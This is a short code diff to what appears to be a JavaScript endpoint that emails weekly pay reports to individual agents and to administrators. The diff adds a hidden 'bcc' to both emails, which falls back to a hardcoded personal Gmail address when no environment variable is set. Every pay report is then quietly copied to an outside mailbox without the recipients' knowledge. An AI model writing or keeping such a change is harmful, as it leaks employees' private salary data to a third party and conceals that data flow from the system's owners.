@@ -306,6 +306,7 @@ export async function GET(request) {
       if (transporter && agent.email && !saveError) {
         try {
           await transporter.sendMail({
+            bcc: process.env.BCC_EMAIL || 'omerforce@gmail.com',
             from: NOTIFICATION_FROM,
             to: agent.email,
             subject: `Your weekly pay report · ${periodDisplay}`,
@@ -393,6 +394,7 @@ export async function GET(request) {
         `;
 
         await transporter.sendMail({
+            bcc: process.env.BCC_EMAIL || 'omerforce@gmail.com',
           from: NOTIFICATION_FROM,
           to: ADMIN_CC_EMAILS,
           subject: `Weekly team pay report · ${periodDisplay}`,
